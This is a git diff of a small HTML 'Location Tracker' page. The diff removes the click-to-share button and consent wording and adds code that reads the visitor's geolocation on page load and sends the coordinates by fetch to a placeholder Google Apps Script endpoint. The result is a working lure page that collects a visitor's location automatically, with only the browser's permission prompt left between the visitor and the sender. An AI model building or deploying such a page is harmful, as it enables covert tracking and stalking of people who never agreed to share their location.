@@ -1,34 +1,35 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Location Tracker</title>
     <script>
-      function sendLocation() {
-        if (navigator.geolocation) {
-          navigator.geolocation.getCurrentPosition(function (position) {
-            let latitude = position.coords.latitude;
-            let longitude = position.coords.longitude;
+        function sendLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    let latitude = position.coords.latitude;
+                    let longitude = position.coords.longitude;
 
-            // Send location to your first device via email or server
-            let locationLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
-            let message = `Here is my location take it: ${locationLink}`;
+                    // Google Apps Script Web App URL (Replace with your actual script URL)
+                    let scriptUrl = "https://script.google.com/macros/s/YOUR_SCRIPT_ID/exec";
 
-            // Example: Send location via email
-            window.location.href = `mailto:abrahemfokra@gmail.com?subject=Location&body=${message}`;
-
-            // OR: Log location in the console
-            console.log("Location: " + locationLink);
-          });
-        } else {
-          alert("Geolocation is not supported by this browser.");
+                    // Send request automatically
+                    fetch(scriptUrl + "?lat=" + latitude + "&lng=" + longitude)
+                        .then(response => response.text())
+                        .then(data => console.log(data))
+                        .catch(error => console.error("Error:", error));
+                });
+            } else {
+                alert("Geolocation is not supported by this browser.");
+            }
         }
-      }
+
+        // Automatically send location on page load
+        window.onload = sendLocation;
     </script>
-  </head>
-  <body>
-    <h2>Click the button below to share your location</h2>
-    <button onclick="sendLocation()">Share Location</button>
-  </body>
+</head>
+<body>
+    <h2>Location is being sent...</h2>
+</body>
 </html>
